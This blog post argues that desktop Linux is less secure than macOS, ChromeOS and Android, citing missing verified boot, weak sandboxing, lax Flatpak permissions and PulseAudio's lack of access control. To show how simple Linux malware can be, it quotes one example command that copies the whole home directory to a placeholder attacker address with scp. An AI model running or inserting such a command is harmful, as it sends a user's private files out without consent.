---
title: "Linux Insecurities"
date: 2022-07-18
tags: ['Operating Systems', 'Linux', 'Security',]
author: Tommy
---

There is a common misconception among privacy communities that Linux is one of the more secure operating systems, either because it is open-source or because it is widely used in the cloud. However, this is a far cry from reality.

There is already a very in-depth technical blog explaining the various security weaknesses of Linux by Madaidan, [Whonix](https://www.whonix.org/)'s Security Researcher. This page will attempt to address some of the questions commonly raised in reaction to his blog post. You can find the original article [here](https://madaidans-insecurities.github.io/linux.html).

![Madaidan's Linux Insecurities](/images/madaidan-insecurities-linux.png)

## Why is Linux used on servers if it is so insecure?

On servers, while most of the problems referenced in the article still exist, they are somewhat less problematic. 

On Desktop Linux, GUI applications run under your user, and thus have access to all of your files in `/home`. This is in contrast to how system daemons typically run on servers, where they have their own group and user. For example, NGINX will run under `nginx:nginx` on Red Hat distributions, or `www-data:www-data` on Debian based ones. Discretionary Access Control does help with filesystem access control for server processes, but is useless for desktop applications.

Another thing to keep in mind is that Mandatory Access Control is also somewhat effective on servers, as commonly run system daemons are confined. In contrast, on desktop, there is virtually no AppArmor profile to confine even regularly used apps like Chrome or Firefox, let alone less common ones. On SELinux systems, these apps run in the UNCONFINED SELinux domain.

Linux servers are lighter than Desktop Linux systems by orders of magnitude, without hundreds of packages and dozens of system daemons running like X11, audio servers, printing stack, and so on. Thus, the attack surface is much smaller.

## Linux Hardening Myths

There is a common claim in response to Madaidan that Linux is only insecure by default, and that an experienced user can make it the most secure operating system out there, surpassing the likes of macOS or ChromeOS. Unfortunately, this is wishful thinking. There is no amount of hardening that one can reasonably apply as a user to fix up the inherent issues with Linux.

### Lack of verified boot

macOS, ChromeOS, and Android have a clear distinction between the system and user installed application. In over simplified terms, the system volume is signed by the OS vendor, and the firmware and boot loader works to make sure that said volume has the authorized signature. The operating system itself is immutable, and nothing the user does will need or be allowed to tamper with the system volume.

On Linux, there is no such clear distinction between the system and user installed applications. Linux distributions are a bunch of packages put together to make a system that works, and thus every package is treated as part of said system. The end result is that binaries, regardless of whether they are vital for the system to function or just an extra application, are thrown into the same directories as each other (namely `/usr/bin` and `/usr/local/bin`). This makes it impossible for an end user to setup a verification mechanism to verify the integrity of "the system", as said "system" is not clearly defined in the first place.

### Lack of application sandboxing

Operating systems like Android and ChromeOS have full system mandatory access control, every process from the init process is strictly confined. Regardless of which application you install or how you install them, they have to play by the rules of an untrusted SELinux domain and are only able to utilize unprivileged APIs.

Even on macOS, where the application sandbox is opt-in for developers, there is still a permission control system (TCC) for unprivileged applications. Apps run by the user do not have unrestricted access to their microphone, webcam, keystrokes, sensitive documents, and so on.

On Linux, it is quite the opposite. Out of the box, most systems only have a few system daemons confined. Some Linux distributions don't even have a Mandatory Access Control system at all. Applications are designed in an environment where they expect to be able to do whatever they want, and the app sandboxes/mandatory access control system are merely an afterthought trying to restrict an app to only access what it expects to be accessible. 

This is reflected in the under utilization of the [Portals API](https://docs.flatpak.org/en/latest/portal-api-reference.html) as an example. Portals is designed to be an API where apps have to prompt the user to access their files (through the File Manager) or their microphone and camera. Unfortunately, the vast majority of apps are not designed with this in mind, and expect direct access to the filesystem, pulseaudio socket or the entire `/dev`. As a result, Flatpak maintainers often opt to have extremely lax permissions to the point where they have to grant `filesystem=home`, `filesystem=host`, `socket=pulseaudio` or `devices=all`, otherwise apps will break and give users a bad experience.

To make matters worse, some system daemons are not designed with permission control in mind at all. For example, PulseAudio does not have any concept of audio in or out permission. Thus, the user is often left with only the choice of granting an app access to the socket or not. If they want to block microphone access, they have to block access to the socket, and thus break audio playback in the process. If they do want an audio playback, then they have to allow access to the PulseAudio socket, which in turns give an app unrestricted access to record them at any moment.

The only way to systematically fix this problem is to design a whole new system from scratch with a permission model like that of Android in mind. And even when that happens, it will take substantial work to get developers to develop their apps for said system.

## But Linux is open source!

Something being open source does not imply that it is inherently private, secure, or trustworthy. I recommend reading the [FLOSS Security](/posts/knowledge/floss-security) post by [Rohan Kumar](https://seirdy.one/posts/2022/02/02/floss-security/).

## But there is less malware on Linux!

**Security by irrelevance does not work**. Just because there are fewer users of your favorite operating system does not make it any safer. 

Ask yourself this: Would you ditch Windows for ReactOS considering that it is a lot less popular and is less targeted? Likewise, would you ditch Linux desktop when it becomes the mainstream solution for the BSDs or some niche operating systems just because they are less popular?

Malware for Linux does exist, and it is not hard to make. It can be something as trivial as a shell script or binary executing `scp -r ~/ malware@xx.xx.xx.xx:/data`. Due to the lack of application sandboxing or an application permission model, your computer can be compromised the moment you execute a malicious binary, shell script, or install script with or without root and with or without an exploit. This is, of course, not to discount the fact that many exploits do exist on Linux just like on any other operating systems as well.
